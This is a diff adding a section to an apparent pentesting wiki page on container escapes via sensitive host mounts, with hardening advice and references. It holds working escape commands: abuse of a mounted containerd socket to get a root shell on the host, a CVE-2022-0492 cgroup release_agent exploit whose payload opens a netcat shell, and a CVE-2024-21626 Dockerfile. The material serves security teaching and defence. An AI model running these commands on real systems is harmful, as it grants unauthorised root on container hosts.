@@ -291,13 +291,73 @@ locate the other containers' filesystems and SA / web identity tokens
 
 
 
+### Other Sensitive Host Sockets and Directories (2023-2025)
+
+Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent to giving the container full root on the node. **Treat the following paths as highly sensitive and never expose them to untrusted workloads**:
+
+```text
+/run/containerd/containerd.sock     # containerd CRI socket
+/var/run/crio/crio.sock             # CRI-O runtime socket
+/run/podman/podman.sock             # Podman API (rootful or rootless)
+/var/run/kubelet.sock               # Kubelet API on Kubernetes nodes
+/run/firecracker-containerd.sock    # Kata / Firecracker
+```
+
+Attack example abusing a mounted **containerd** socket:
+
+```bash
+# inside the container (socket is mounted at /host/run/containerd.sock)
+ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
+ctr --address /host/run/containerd.sock run --tty --privileged --mount \
+  type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
+chroot /host /bin/bash   # full root shell on the host
+```
+
+A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.
+
+Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:
+
+```bash
+# assuming the container has CAP_SYS_ADMIN and a vulnerable kernel
+mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
+
+echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # requires CVE-2022-0492
+
+echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
+sh -c "echo 0 > /tmp/x/cgroup.procs"  # triggers the empty-cgroup event
+```
+
+When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.  
+
+### Mount-Related Escape CVEs (2023-2025)
+
+* **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**  
+  runc ≤1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥25.0.3, containerd ≥1.7.14). 
+
+  ```Dockerfile
+  FROM scratch
+  WORKDIR /proc/self/fd/4   # 4 == "/" on the host leaked by the runtime
+  CMD ["/bin/sh"]
+  ```
+
+* **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**  
+  A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.
+
+### Hardening Reminders (2025)
+
+1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
+2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
+3. Keep the container runtime up-to-date (runc ≥1.1.12, BuildKit ≥0.12.5, containerd ≥1.7.14).
+4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.
+
 ### References
 
+- [runc CVE-2024-21626 advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
+- [Unit 42 analysis of CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 - [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
 - [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
 
 {{#include ../../../../banners/hacktricks-training.md}}
-
 
 
